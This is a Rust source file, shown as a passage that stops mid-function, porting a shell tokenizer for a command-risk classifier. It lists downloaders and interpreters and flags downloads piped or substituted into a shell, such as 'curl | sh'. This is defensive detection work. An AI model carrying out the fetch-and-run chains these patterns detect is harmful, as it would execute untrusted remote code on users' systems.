// SPDX-License-Identifier: GPL-3.0-only
//! Rust port of the `shell_tokens.py` analyzer shipped with the
//! `cat-shell-risk-commander` A1 (`format_version: 2`) model.
//!
//! The model adds a second TF-IDF feature block whose analyzer is a
//! deterministic shell tokenizer: it splits on whitespace and shell operators,
//! normalizes volatile pieces (quoted strings, URLs, IPs, numbers) to stable
//! placeholders, and emits unigrams, adjacent bigrams and three structural
//! markers (command head, pipe target, redirect target). This lets the scorer
//! tell `curl | jq` from `curl | sh` without ever executing the text.
//!
//! Since issue #159 the analyzer also appends relation markers from a small,
//! depth-limited parse of the same tokens: does downloaded content flow into an
//! interpreter (pipe, process/command substitution, `-c` script, PowerShell
//! `iex`), is a downloaded file executed, or does it only reach a file or a
//! pure filter? See [`relations`].
//!
//! This port is bit-exact with the Python reference: `features` here returns
//! the same multiset of feature strings as `shell_tokens.features` there, which
//! is all the downstream TF-IDF vectorizer consumes. The text is never parsed,
//! expanded or run.

use std::borrow::Cow;

/// Operators kept verbatim by [`normalise`] (the Python `OPERATORS` set).
fn is_operator(token: &str) -> bool {
    matches!(
        token,
        "|" | "||" | "&&" | ";" | "&" | "(" | ")" | "$(" | "<" | ">" | ">>"
    )
}

/// Python `str.isspace`/`re` `\s`: Unicode whitespace plus the ASCII
/// information separators U+001C..U+001F, but not U+FEFF.
fn is_shell_whitespace(c: char) -> bool {
    c.is_whitespace() || ('\u{1c}'..='\u{1f}').contains(&c)
}

/// A character that ends a bare word run: `[\s|;&<>()'"]`.
fn is_word_boundary(c: char) -> bool {
    is_shell_whitespace(c) || matches!(c, '|' | ';' | '&' | '<' | '>' | '(' | ')' | '\'' | '"')
}

/// Full match of the Python `\d*>&\d*` file-descriptor redirect pattern, e.g.
/// `>&`, `2>&1`, `0>&1`.
fn is_fd_redirect(token: &str) -> bool {
    let bytes = token.as_bytes();
    let mut index = 0;
    while index < bytes.len() && bytes[index].is_ascii_digit() {
        index += 1;
    }
    if bytes.get(index) != Some(&b'>') || bytes.get(index + 1) != Some(&b'&') {
        return false;
    }
    index += 2;
    while index < bytes.len() && bytes[index].is_ascii_digit() {
        index += 1;
    }
    index == bytes.len()
}

/// End byte of a `\d*>&\d*` token starting at `start`, or `None`.
fn scan_fd_redirect(bytes: &[u8], start: usize) -> Option<usize> {
    let mut index = start;
    while index < bytes.len() && bytes[index].is_ascii_digit() {
        index += 1;
    }
    if bytes.get(index) != Some(&b'>') || bytes.get(index + 1) != Some(&b'&') {
        return None;
    }
    index += 2;
    while index < bytes.len() && bytes[index].is_ascii_digit() {
        index += 1;
    }
    Some(index)
}

/// End byte of a `"(?:\\.|[^"\\])*"` double-quoted string starting at `start`,
/// mirroring Python's `.` not matching a newline after a backslash.
fn scan_double_quote(text: &str, start: usize) -> Option<usize> {
    let bytes = text.as_bytes();
    let mut index = start + 1;
    while index < bytes.len() {
        match bytes[index] {
            b'"' => return Some(index + 1),
            b'\\' => {
                // `\\.`: a backslash must be followed by a non-newline char.
                match bytes.get(index + 1) {
                    None | Some(b'\n') => return None,
                    Some(_) => index += 1 + next_char_len(text, index + 1),
                }
            }
            // `[^"\\]` matches any other character, newline included.
            _ => index += next_char_len(text, index),
        }
    }
    None
}

/// Byte length of the UTF-8 character starting at `index`.
fn next_char_len(text: &str, index: usize) -> usize {
    text[index..].chars().next().map_or(1, char::len_utf8)
}

/// Split `text` into tokens, matching `shell_tokens.tokens` (the Python
/// `TOKEN.findall`). Alternatives are tried in the Python order; an unmatched
/// character (stray quote, whitespace) is skipped.
fn tokenize(text: &str) -> Vec<&str> {
    tokenize_with(text, false)
}

/// `structural` adds the two leading alternatives of the Python `STRUCT_TOKEN`
/// pattern used by [`relations`]: `<NAME>` placeholders stay one token and a
/// newline is its own token (a command separator).
fn tokenize_with(text: &str, structural: bool) -> Vec<&str> {
    let bytes = text.as_bytes();
    let mut tokens = Vec::new();
    let mut pos = 0;
    while pos < bytes.len() {
        let byte = bytes[pos];
        if structural {
            // `<[A-Za-z_][A-Za-z0-9_-]*>`
            if let Some(end) = scan_placeholder(bytes, pos) {
                tokens.push(&text[pos..end]);
                pos = end;
                continue;
            }
            // `\n`
            if byte == b'\n' {
                tokens.push(&text[pos..pos + 1]);
                pos += 1;
                continue;
            }
        }
        // Whitespace is never a token; skip the whole character.
        let first = text[pos..].chars().next().unwrap();
        if is_shell_whitespace(first) {
            pos += first.len_utf8();
            continue;
        }
        // `'[^']*'`
        if byte == b'\'' {
            if let Some(close) = text[pos + 1..].find('\'') {
                let end = pos + 1 + close + 1;
                tokens.push(&text[pos..end]);
                pos = end;
                continue;
            }
            pos += 1;
            continue;
        }
        // `"(?:\\.|[^"\\])*"`
        if byte == b'"' {
            if let Some(end) = scan_double_quote(text, pos) {
                tokens.push(&text[pos..end]);
                pos = end;
                continue;
            }
            pos += 1;
            continue;
        }
        // Two-character operators `$(`, `||`, `&&`, `>>`, in Python order.
        let two = bytes.get(pos..pos + 2);
        if matches!(two, Some(b"$(" | b"||" | b"&&" | b">>")) {
            tokens.push(&text[pos..pos + 2]);
            pos += 2;
            continue;
        }
        // `\d*>&\d*`
        if let Some(end) = scan_fd_redirect(bytes, pos) {
            tokens.push(&text[pos..end]);
            pos = end;
            continue;
        }
        // Single-character operators `[|;&<>()]`.
        if matches!(byte, b'|' | b';' | b'&' | b'<' | b'>' | b'(' | b')') {
            tokens.push(&text[pos..pos + 1]);
            pos += 1;
            continue;
        }
        // Bare word `[^\s|;&<>()'"]+`.
        let mut end = pos;
        while end < bytes.len() {
            let ch = text[end..].chars().next().unwrap();
            if is_word_boundary(ch) {
                break;
            }
            end += ch.len_utf8();
        }
        tokens.push(&text[pos..end]);
        pos = end;
    }
    tokens
}

/// End byte of a `<[A-Za-z_][A-Za-z0-9_-]*>` placeholder starting at `start`.
fn scan_placeholder(bytes: &[u8], start: usize) -> Option<usize> {
    if bytes.get(start) != Some(&b'<') {
        return None;
    }
    let first = *bytes.get(start + 1)?;
    if !(first.is_ascii_alphabetic() || first == b'_') {
        return None;
    }
    let mut index = start + 2;
    while index < bytes.len()
        && (bytes[index].is_ascii_alphanumeric() || matches!(bytes[index], b'_' | b'-'))
    {
        index += 1;
    }
    (bytes.get(index) == Some(&b'>')).then_some(index + 1)
}

/// `^[a-z][a-z0-9+.-]*://` (case-insensitive prefix).
fn is_url(token: &str) -> bool {
    let bytes = token.as_bytes();
    if bytes.first().is_none_or(|b| !b.is_ascii_alphabetic()) {
        return false;
    }
    let mut index = 1;
    while index < bytes.len()
        && (bytes[index].is_ascii_alphanumeric() || matches!(bytes[index], b'+' | b'.' | b'-'))
    {
        index += 1;
    }
    bytes[index..].starts_with(b"://")
}

/// `^\d{1,3}(\.\d{1,3}){3}(:\d+)?$`.
fn is_ipv4(token: &str) -> bool {
    let bytes = token.as_bytes();
    let mut index = 0;
    let octet = |bytes: &[u8], index: &mut usize| {
        let start = *index;
        while *index < bytes.len() && *index - start < 3 && bytes[*index].is_ascii_digit() {
            *index += 1;
        }
        *index > start
    };
    if !octet(bytes, &mut index) {
        return false;
    }
    for _ in 0..3 {
        if bytes.get(index) != Some(&b'.') {
            return false;
        }
        index += 1;
        if !octet(bytes, &mut index) {
            return false;
        }
    }
    if bytes.get(index) == Some(&b':') {
        index += 1;
        let start = index;
        while index < bytes.len() && bytes[index].is_ascii_digit() {
            index += 1;
        }
        if index == start {
            return false;
        }
    }
    index == bytes.len()
}

/// `^[a-z0-9.-]+\.[a-z]{2,}:\d+$` (case-insensitive).
fn is_hostport(token: &str) -> bool {
    let Some(colon) = token.rfind(':') else {
        return false;
    };
    let (left, port) = (&token[..colon], &token[colon + 1..]);
    if port.is_empty() || !port.bytes().all(|b| b.is_ascii_digit()) {
        return false;
    }
    // The TLD is letters only, so the host/TLD split is the last dot in `left`.
    let Some(dot) = left.rfind('.') else {
        return false;
    };
    let (host, tld) = (&left[..dot], &left[dot + 1..]);
    if host.is_empty()
        || !host
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-'))
    {
        return false;
    }
    tld.len() >= 2 && tld.bytes().all(|b| b.is_ascii_alphabetic())
}

/// `^-?\d+$`.
fn is_number(token: &str) -> bool {
    let digits = token.strip_prefix('-').unwrap_or(token);
    !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_digit())
}

/// Normalize one raw token, matching `shell_tokens.normalise`.
fn normalise(token: &str) -> String {
    if is_operator(token) || is_fd_redirect(token) {
        return token.to_string();
    }
    let first = token.as_bytes()[0];
    if (first == b'\'' || first == b'"') && token.chars().count() > 1 {
        return "<STR>".to_string();
    }
    if is_url(token) {
        return "<URL>".to_string();
    }
    if is_ipv4(token) {
        return "<IP>".to_string();
    }
    if is_hostport(token) {
        return "<HOSTPORT>".to_string();
    }
    if is_number(token) {
        return if token.starts_with('-') {
            "-<NUM>"
        } else {
            "<NUM>"
        }
        .to_string();
    }
    token.to_lowercase()
}

/// Command name without its directory, e.g. `/usr/bin/python3` -> `python3`.
fn head(token: &str) -> &str {
    token.rsplit('/').next().unwrap_or(token)
}

// ---- Heredoc bodies that are code, not shell ----
//
// `python - <<'PY' … PY` feeds Python, and `cat <<'EOF' > fix.py` writes Python;
// neither body is shell. Tokenised as shell, list syntax such as
// `['ssh','-o',…]` becomes `[`, `,` and `CMD=[` tokens that only attacks carried
// in training. Such a body is replaced by one `heredoc_body` line for this
// block (the char_wb block still sees the raw text). Port of `mask_heredocs` in
// `shell_tokens.py`; the regex lookaheads there are spelled out by hand here.

const HEREDOC_MASK: &str = "heredoc_body";

/// Characters that end a word for the heredoc checks: `[\s;&|()<>'"]`.
fn is_heredoc_word_end(c: char) -> bool {
    is_shell_whitespace(c) || matches!(c, ';' | '&' | '|' | '(' | ')' | '<' | '>' | '\'' | '"')
}

/// The lookahead `(?=[\s;&|()<>]|$)`: end of line or a separator (not a quote).
fn is_heredoc_boundary(line: &str, at: usize) -> bool {
    line[at..].chars().next().is_none_or(|c| {
        is_shell_whitespace(c) || matches!(c, ';' | '&' | '|' | '(' | ')' | '<' | '>')
    })
}

/// Start and end of every word that begins the line or follows `[\s;&|(]`.
fn heredoc_words(line: &str) -> impl Iterator<Item = (usize, usize)> + '_ {
    line.char_indices().filter_map(move |(start, c)| {
        let follows_separator = line[..start]
            .chars()
            .next_back()
            .is_none_or(|prev| is_shell_whitespace(prev) || matches!(prev, ';' | '&' | '|' | '('));
        if !follows_separator || is_heredoc_word_end(c) {
            return None;
        }
        let end = line[start..]
            .char_indices()
            .find(|&(_, c)| is_heredoc_word_end(c))
            .map_or(line.len(), |(offset, _)| start + offset);
        Some((start, end))
    })
}

/// `python[0-9.]*`, `node`, `ruby` or `perl`, after an optional `…/` path.
fn is_heredoc_interpreter(word: &str) -> bool {
    let name = word.rsplit('/').next().unwrap_or(word);
    matches!(name, "node" | "ruby" | "perl")
        || name
            .strip_prefix("python")
            .is_some_and(|rest| rest.bytes().all(|b| b.is_ascii_digit() || b == b'.'))
}

/// End of the first word matching `(?:^|[\s;&|(])(?:[^\s;&|()<>'"]*/)?(?:python[0-9.]*|node|ruby|perl)(?=…)`.
fn heredoc_interpreter_end(line: &str) -> Option<usize> {
    heredoc_words(line)
        .find(|&(start, end)| {
            is_heredoc_boundary(line, end) && is_heredoc_interpreter(&line[start..end])
        })
        .map(|(_, end)| end)
}

/// The first `(?:^|[\s;&|(])(?:cat|tee)(?=…)`: (match start, word end). The
/// match starts at the separator before the word, or at 0 for the line start.
fn heredoc_writer(line: &str) -> Option<(usize, usize)> {
    heredoc_words(line)
        .find(|&(start, end)| {
            matches!(&line[start..end], "cat" | "tee") && is_heredoc_boundary(line, end)
        })
        .map(|(start, end)| {
            let separator = line[..start]
                .char_indices()
                .next_back()
                .map_or(0, |(i, _)| i);
            (separator, end)
        })
}

const HEREDOC_FILE_EXTENSIONS: [&str; 20] = [
    "py", "pyi", "js", "mjs", "cjs", "ts", "tsx", "jsx", "rb", "pl", "pm", "php", "r", "jl",
    "json", "yml", "yaml", "toml", "ini", "cfg",
];

/// `\s*['"]?[^\s;&|()<>'"]+\.(?:ext…)['"]?(?=…)` at `at`, case-insensitive.
fn heredoc_file_target_at(line: &str, at: usize) -> bool {
    let rest = &line[at..];
    let mut pos = at + (rest.len() - rest.trim_start_matches(is_shell_whitespace).len());
    if matches!(line.as_bytes().get(pos), Some(b'\'' | b'"')) {
        pos += 1;
    }
    let end = line[pos..]
        .char_indices()
        .find(|&(_, c)| is_heredoc_word_end(c))
        .map_or(line.len(), |(offset, _)| pos + offset);
    let path = &line[pos..end];
    let Some(dot) = path.rfind('.') else {
        return false;
    };
    let extension = path[dot + 1..].to_ascii_lowercase();
    if dot == 0 || !HEREDOC_FILE_EXTENSIONS.contains(&extension.as_str()) {
        return false;
    }
    if is_heredoc_boundary(line, end) {
        return true;
    }
    matches!(line.as_bytes().get(end), Some(b'\'' | b'"')) && is_heredoc_boundary(line, end + 1)
}

/// Whether `(?:>>?|\btee(?:\s+-a)?)` followed by a code or data file name
/// matches anywhere from `from` (Python `HEREDOC_FILE.search(line, start)`).
fn heredoc_writes_code_file(line: &str, from: usize) -> bool {
    let bytes = line.as_bytes();
    for (k, c) in line[from..].char_indices().map(|(i, c)| (from + i, c)) {
        if c == '>' {
            if bytes.get(k + 1) == Some(&b'>') && heredoc_file_target_at(line, k + 2) {
                return true;
            }
            if heredoc_file_target_at(line, k + 1) {
                return true;
            }
        }
        let word_before = line[..k]
            .chars()
            .next_back()
            .is_some_and(|prev| prev.is_alphanumeric() || prev == '_');
        if !word_before
            && line[k..]
                .get(..3)
                .is_some_and(|w| w.eq_ignore_ascii_case("tee"))
        {
            let after = k + 3;
            let rest = &line[after..];
            let spaces = rest.len() - rest.trim_start_matches(is_shell_whitespace).len();
            if spaces > 0
                && rest[spaces..].starts_with("-a")
                && heredoc_file_target_at(line, after + spaces + 2)
            {
                return true;
            }
            if heredoc_file_target_at(line, after) {
                return true;
            }
        }
    }
    false
}

/// `<<-?[ \t]*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1` at `k`: (end, delimiter).
fn heredoc_op_at(line: &str, k: usize) -> Option<(usize, &str)> {
    let bytes = line.as_bytes();
    if !line[k..].starts_with("<<") {
        return None;
    }
    let mut pos = k + 2;
    if bytes.get(pos) == Some(&b'-') {
        pos += 1;
    }
    while matches!(bytes.get(pos), Some(b' ' | b'\t')) {
        pos += 1;
    }
    let quote = match bytes.get(pos) {
        Some(&q @ (b'\'' | b'"')) => {
            pos += 1;
            Some(q)
        }
        _ => None,
    };
    let start = pos;
    if !bytes
        .get(pos)
        .is_some_and(|b| b.is_ascii_alphabetic() || *b == b'_')
    {
        return None;
    }
    while bytes
        .get(pos)
        .is_some_and(|b| b.is_ascii_alphanumeric() || *b == b'_')
    {
        pos += 1;
    }
    let delimiter = &line[start..pos];
    match quote {
        Some(q) if bytes.get(pos) == Some(&q) => Some((pos + 1, delimiter)),
        Some(_) => None,
        None => Some((pos, delimiter)),
    }
}

/// Delimiter of the first `<<` heredoc that feeds a non-shell interpreter, or
/// that cat/tee write to a code or data file, on `line`.
fn heredoc_delimiter(line: &str) -> Option<&str> {
    let from = match heredoc_interpreter_end(line) {
        Some(end) => end,
        None => {
            let (start, end) = heredoc_writer(line)?;
            if !heredoc_writes_code_file(line, start) {
                return None;
            }
            end
        }
    };
    let mut k = from;
    while k < line.len() {
        if let Some((end, delimiter)) = heredoc_op_at(line, k) {
            if !line[..k].ends_with('<') {
                return Some(delimiter);
            }
            k = end;
            continue;
        }
        k += line[k..].chars().next().map_or(1, char::len_utf8);
    }
    None
}

/// Replace heredoc bodies that are code (see above) by one `heredoc_body` line.
/// Matches `shell_tokens.mask_heredocs`.
pub fn mask_heredocs(text: &str) -> Cow<'_, str> {
    if !text.contains("<<") {
        return Cow::Borrowed(text);
    }
    let mut out: Vec<&str> = Vec::new();
    let mut delimiter: Option<&str> = None;
    for line in text.split('\n') {
        if let Some(open) = delimiter {
            if line.trim_matches([' ', '\t', '\r']) == open {
                out.push(line);
                delimiter = None;
            }
            continue;
        }
        out.push(line);
        delimiter = heredoc_delimiter(line);
        if delimiter.is_some() {
            out.push(HEREDOC_MASK);
        }
    }
    Cow::Owned(out.join("\n"))
}

/// The deterministic shell-token features of `text`, as a multiset in the same
/// shape the Python `shell_tokens.features` produces (unigrams, adjacent
/// bigrams, the `CMD=`, `PIPE->` and `REDIR->` structural markers, then the
/// `DL->` relation markers), after [`mask_heredocs`].
pub fn features(text: &str) -> Vec<String> {
    let text: &str = &mask_heredocs(text);
    let norm: Vec<String> = tokenize(text).into_iter().map(normalise).collect();

    // Unigrams first, then bigrams and markers, in the reference order.
    let mut extra = Vec::with_capacity(norm.len() * 2);
    for pair in norm.windows(2) {
        extra.push(format!("{} {}", pair[0], pair[1]));
    }

    let mut at_start = true;
    let mut after: Option<&str> = None;
    for value in &norm {
        let value = value.as_str();
        if is_operator(value) || is_fd_redirect(value) {
            at_start = matches!(value, "|" | "||" | "&&" | ";" | "&" | "(" | "$(");
            after = match value {
                "|" => Some("|"),
                ">" => Some(">"),
                ">>" => Some(">>"),
                "<" => Some("<"),
                _ => None,
            };
            continue;
        }
        match after {
            Some("|") => extra.push(format!("PIPE->{}", head(value))),
            Some(">") | Some(">>") => {
                let target = if value == "/dev/null" {
                    "/dev/null"
                } else if value.starts_with("/dev/") {
                    "<DEV>"
                } else {
                    "<FILE>"
                };
                extra.push(format!("REDIR->{target}"));
            }
            _ => {}
        }
        if at_start {
            extra.push(format!("CMD={}", head(value)));
        }
        at_start = false;
        after = None;
    }
    let mut out = norm;
    out.append(&mut extra);
    out.extend(relations(text).into_iter().map(str::to_string));
    out
}

// ---- Relation markers (issue #159): does a download flow into an interpreter? ----
//
// A port of `relations` in `shell_tokens.py`: a small recursive parse over the
// structural tokens. Backticks become `$( … )`, newlines separate commands,
// `#` words start a comment up to the newline, quoted strings and
// substitutions are parsed as nested scripts (depth-limited). Each marker is
// emitted at most once per text, in the fixed `RELATIONS` order.

const PIPE_INTERP: u8 = 1;
const SUBST_INTERP: u8 = 1 << 1;
const FILE_EXEC: u8 = 1 << 2;
const PIPE_FILTER: u8 = 1 << 3;
const FILE_ONLY: u8 = 1 << 4;
const RELATIONS: [(u8, &str); 5] = [
    (PIPE_INTERP, "DL->PIPE->INTERP"),
    (SUBST_INTERP, "DL->SUBST->INTERP"),
    (FILE_EXEC, "DL->FILE->EXEC"),
    (PIPE_FILTER, "DL->PIPE->FILTER"),
    (FILE_ONLY, "DL->FILE"),
];
/// Analysis depth for nested scripts (substitutions, quoted `-c` scripts).
const MAX_DEPTH: usize = 3;
/// Deeper `( … )` / `$( … )` nesting yields no relation markers at all, which
/// keeps the recursive parse bounded for any input.
const MAX_NESTING: usize = 32;
const NET_METHODS: [&str; 2] = [".downloadstring", ".downloaddata"];

fn is_downloader(name: &str) -> bool {
    matches!(
        name,
        "curl"
            | "curl.exe"
            | "wget"
            | "wget.exe"
            | "iwr"
            | "irm"
            | "invoke-webrequest"
            | "invoke-restmethod"
    )
}

fn is_interpreter(name: &str) -> bool {
    matches!(
        name,
        "sh" | "bash"
            | "zsh"
            | "dash"
            | "ksh"
            | "fish"
            | "python"
            | "python2"
            | "python3"
            | "perl"
            | "ruby"
            | "node"
            | "php"
            | "pwsh"
            | "pwsh.exe"
            | "powershell"
            | "powershell.exe"
            | "cmd"
            | "cmd.exe"
            | "iex"
            | "invoke-expression"
            | "eval"
            | "source"
            | "."
    )
}

fn is_runner(name: &str) -> bool {
    is_interpreter(name)
        || matches!(
            name,
            "start" | "start-process" | "saps" | "msiexec" | "msiexec.exe"
        )
}

fn is_filter(name: &str) -> bool {
    matches!(
        name,
        "jq" | "head"
            | "tail"
            | "grep"
            | "egrep"
            | "fgrep"
            | "rg"
            | "wc"
            | "sort"
            | "uniq"
            | "less"
            | "more"
            | "cat"
            | "cut"
            | "tr"
            | "column"
            | "tee"
            | "awk"
            | "sed"
            | "sha256sum"
            | "shasum"
            | "md5sum"
            | "select-string"
            | "sls"
            | "convertfrom-json"
            | "select-object"
            | "select"
            | "measure-object"
            | "measure"
            | "format-list"
            | "format-table"
            | "where-object"
            | "out-string"
            | "out-null"
    )
}

fn is_prefix(name: &str) -> bool {
    matches!(
        name,
        "sudo" | "doas" | "env" | "exec" | "command" | "nohup" | "time"
    )
}

fn is_script_flag(flag: &str) -> bool {
    matches!(flag, "-c" | "-lc" | "-ic" | "-command" | "/c" | "/k")
}

/// One word of a parsed command.
#[derive(Clone)]
enum Word {
    /// A bare word.
    Bare(String),
    /// The inside of a quoted string.
    Quoted(String),
    /// `<` or a file-descriptor redirect such as `2>&1`.
    Redirect,
    /// `>` or `>>`, whose next word is the redirect target.
    RedirectOut,
    /// `$( … )` command substitution (backticks included).
    Subst(Script),
    /// `( … )` group or `<( … )` process substitution.
    Group(Script),
}

type Command = Vec<Word>;
type Script = Vec<Vec<Command>>;

/// Backticks become `$(` / `)` alternately, as in the Python `_struct_tokens`.
fn struct_text(text: &str) -> String {
    let mut parts = text.split('`');
    let mut joined = parts.next().unwrap_or("").to_string();
    for (index, part) in parts.enumerate() {
        joined.push_str(if index % 2 == 0 { " $( " } else { " ) " });
        joined.push_str(part);
    }
    joined
}

/// Deepest `( … )` / `$( … )` nesting up to the first unmatched `)`, where
/// parsing stops.
fn nesting(tokens: &[&str]) -> usize {
    let (mut depth, mut deepest) = (0_isize, 0_isize);
    for &token in tokens {
        if token == "$(" || token == "(" {
            depth += 1;
            deepest = deepest.max(depth);
        } else if token == ")" {
            depth -= 1;
            if depth < 0 {
                break;
            }
        }
    }
    deepest as usize
}

/// Script = pipelines; pipeline = commands; command = words (Python `_parse`).
fn parse_text(text: &str) -> Script {
    let joined = struct_text(text);
    let tokens = tokenize_with(&joined, true);
    if nesting(&tokens) > MAX_NESTING {
        return Vec::new();
    }
    let mut pos = 0;
    parse_script(&tokens, &mut pos)
}

fn parse_script(tokens: &[&str], pos: &mut usize) -> Script {
    let mut pipes: Vec<Vec<Command>> = Vec::new();
    let mut pipe: Vec<Command> = Vec::new();
    let mut cmd: Command = Vec::new();
    while *pos < tokens.len() {
        let token = tokens[*pos];
        *pos += 1;
        if token == ")" {
            break;
        }
        if token.starts_with('#') {
            while *pos < tokens.len() && tokens[*pos] != "\n" {
                *pos += 1;
            }
        } else if token == "$(" {
            cmd.push(Word::Subst(parse_script(tokens, pos)));
        } else if token == "(" {
            cmd.push(Word::Group(parse_script(tokens, pos)));
        } else if token == "<" && tokens.get(*pos) == Some(&"(") {
            *pos += 1;
            cmd.push(Word::Group(parse_script(tokens, pos)));
        } else if token == "|" {
            pipe.push(std::mem::take(&mut cmd));
        } else if matches!(token, "||" | "&&" | ";" | "&" | "\n") {
            pipe.push(std::mem::take(&mut cmd));
            pipes.push(std::mem::take(&mut pipe));
        } else if token == ">" || token == ">>" {
            cmd.push(Word::RedirectOut);
        } else if token == "<" || is_fd_redirect(token) {
            cmd.push(Word::Redirect);
        } else if (token.starts_with('\'') || token.starts_with('"')) && token.chars().count() > 1 {
            // A quoted token ends with its opening quote, one ASCII byte.
            let inner = if token.ends_with(&token[..1]) {
                &token[1..token.len() - 1]
            } else {
                &token[1..]
            };
            cmd.push(Word::Quoted(inner.to_string()));
        } else {
            cmd.push(Word::Bare(token.to_string()));
        }
    }
    pipe.push(cmd);
    pipes.push(pipe);
    pipes
        .into_iter()
        .filter(|pipe| pipe.iter().any(|cmd| !cmd.is_empty()))
        .map(|pipe| pipe.into_iter().filter(|cmd| !cmd.is_empty()).collect())
        .collect()
}

/// Lowercase basename without surrounding quotes (Python `_base`).
fn base(word: &str) -> String {
    let word = word.trim_matches(|c| c == '\'' || c == '"');
    word.rsplit(['\\', '/']).next().unwrap_or("").to_lowercase()
}

/// `[A-Za-z_][A-Za-z0-9_]*=.*` (full match).
fn is_assignment(word: &str) -> bool {
    let bytes = word.as_bytes();
    if bytes
        .first()
        .is_none_or(|b| !(b.is_ascii_alphabetic() || *b == b'_'))
    {
        return false;
    }
    let mut index = 1;
    while index < bytes.len() && (bytes[index].is_ascii_alphanumeric() || bytes[index] == b'_') {
        index += 1;
    }
    bytes.get(index) == Some(&b'=')
}

/// Text of a bare or quoted word.
fn word_text(word: &Word) -> Option<&str> {
    match word {
        Word::Bare(text) | Word::Quoted(text) => Some(text),
        _ => None,
    }
}

/// Index and lowercase name of the command head, skipping sudo/env prefixes.
fn command_head(cmd: &[Word]) -> (usize, Option<String>) {
    let (mut index, mut prefixed) = (0, false);
    while index < cmd.len() {
        let Word::Bare(value) = &cmd[index] else {
            return (index, None);
        };
        let name = base(value);
        let prefix = is_prefix(&name);
        if prefix || is_assignment(value) || (prefixed && value.starts_with('-')) {
            prefixed = prefixed || prefix;
            index += 1;
            continue;
        }
        return (index, Some(name));
    }
    (index, None)
}

#[derive(PartialEq)]
enum Download {
    None,
    Stdout,
    File(String),
}

fn download(cmd: &[Word], depth: usize) -> Download {
    let (index, name) = command_head(cmd);
    let mut target: Option<String> = None;
    for (k, word) in cmd.iter().enumerate() {
        if matches!(word, Word::RedirectOut) && k + 1 < cmd.len() {
            target = word_text(&cmd[k + 1]).map(base);
        }
    }
    if let Some(name) = name.as_deref().filter(|name| is_downloader(name)) {
        let args: Vec<&str> = cmd[index + 1..].iter().filter_map(word_text).collect();
        if name.starts_with("wget") && args.iter().any(|a| a.starts_with("--post-")) {
            return Download::None; // upload, not a download
        }
        return match output_file(name, &args).or(target) {
            None => Download::Stdout,
            Some(file) => Download::File(file),
        };
    }
    let calls_net_method = cmd
        .iter()
        .filter_map(word_text)
        .any(|word| starts_with_net_method(&word.to_lowercase()));
    if calls_net_method {
        return target.map_or(Download::Stdout, Download::File);
    }
    if let Some(Word::Group(inner) | Word::Subst(inner)) = cmd.get(index) {
        if depth < MAX_DEPTH && emits(inner, depth + 1) {
            return Download::Stdout;
        }
    }
    Download::None
}

fn starts_with_net_method(lower: &str) -> bool {
    NET_METHODS.iter().any(|method| lower.starts_with(method))
}

/// `-[A-Za-z]+` (full match).
fn is_short_flag_cluster(arg: &str) -> bool {
    arg.len() > 1 && arg.starts_with('-') && arg[1..].bytes().all(|b| b.is_ascii_alphabetic())
}

/// `-[A-Za-z]*O` followed by `suffix` (full match).
fn is_wget_output_flag(arg: &str, suffix: &str) -> bool {
    let Some(body) = arg
        .strip_prefix('-')
        .and_then(|rest| rest.strip_suffix(suffix))
    else {
        return false;
    };
    body.ends_with('O') && body.bytes().all(|b| b.is_ascii_alphabetic())
}

/// Basename the downloader writes to, or `None` for stdout.
fn output_file(name: &str, args: &[&str]) -> Option<String> {
    let url = args.iter().copied().find(|arg| is_url(arg)).unwrap_or("");
    let remote = if url.is_empty() {
        "remote".to_string()
    } else {
        base(url.split('?').next().unwrap_or(""))
    };
    if name.starts_with("curl") {
        for (k, arg) in args.iter().enumerate() {
            if matches!(*arg, "-o" | "--output") && k + 1 < args.len() {
                return Some(base(args[k + 1]));
            }
            if matches!(*arg, "-O" | "--remote-name" | "--remote-name-all") {
                return Some(remote);
            }
            if is_short_flag_cluster(arg) && (arg.contains('o') || arg.contains('O')) {
                return Some(if arg.ends_with('o') && k + 1 < args.len() {
                    base(args[k + 1])
                } else {
                    remote
                });
            }
        }
        return None;
    }
    if name.starts_with("wget") {
        for (k, arg) in args.iter().enumerate() {
            if let Some(file) = arg.strip_prefix("--output-document=") {
                return (!arg.ends_with("=-")).then(|| base(file));
            }
            if *arg == "--output-document" || is_wget_output_flag(arg, "") {
                let next = args.get(k + 1).copied().unwrap_or("-");
                return (!matches!(next, "-" | "/dev/stdout")).then(|| base(next));
            }
            if is_wget_output_flag(arg, "-") {
                return None;
            }
        }
        return Some(remote);
    }
    // PowerShell cmdlets: an object on stdout unless -OutFile.
    for (k, arg) in args.iter().enumerate() {
        if arg.to_lowercase() == "-outfile" && k + 1 < args.len() {
            return Some(base(args[k + 1]));
        }
    }
    None
}

/// True when the script's output contains downloaded content.
fn emits(script: &Script, depth: usize) -> bool {
    script
        .iter()
        .flatten()
        .any(|cmd| download(cmd, depth) == Download::Stdout)
}

/// Scripts an interpreter receives as text: every quoted argument, plus an
/// unquoted tail after `-c`, `-Command` or `/c` (`cmd /c curl … && x.bat`).
fn nested(cmd: &[Word], index: usize) -> Vec<Script> {
    let rest = &cmd[index + 1..];
    let mut out: Vec<Script> = rest
        .iter()
        .filter_map(|word| match word {
            Word::Quoted(text) => Some(parse_text(text)),
            _ => None,
        })
        .collect();
    for (k, word) in rest.iter().enumerate() {
        if let Word::Bare(value) = word {
            if is_script_flag(&value.to_lowercase()) {
                if matches!(rest.get(k + 1), Some(Word::Bare(_))) {
                    out.push(vec![vec![rest[k + 1..].to_vec()]]);
                }
                break;
            }
        }
    }
    out
}

fn scan(script: &Script, found: &mut u8, depth: usize) {
    if depth > MAX_DEPTH {
        return;
    }
    let mut files: Vec<String> = Vec::new();
    let mut executed: Vec<String> = Vec::new();
    for pipe in script {
        for (n, cmd) in pipe.iter().enumerate() {
            let (index, name) = command_head(cmd);
            let name = name.as_deref();
            let dl = download(cmd, depth);
            match &dl {
                Download::Stdout => {
                    let later: Vec<Option<String>> =
                        pipe[n + 1..].iter().map(|c| command_head(c).1).collect();
                    if later.iter().flatten().any(|head| is_interpreter(head)) {
                        *found |= PIPE_INTERP;
                    } else if !later.is_empty()
                        && later
                            .iter()
                            .all(|head| head.as_deref().is_some_and(is_filter))
                    {
                        *found |= PIPE_FILTER;
                    }
                }
                Download::File(file) => {
                    if !files.contains(file) {
                        files.push(file.clone());
                    }
                }
                Download::None => {}
            }
            // `$(download)` in command position runs it.
            if let Some(Word::Subst(inner)) = cmd.get(index) {
                if emits(inner, depth + 1) {
                    *found |= SUBST_INTERP;
                }
            }
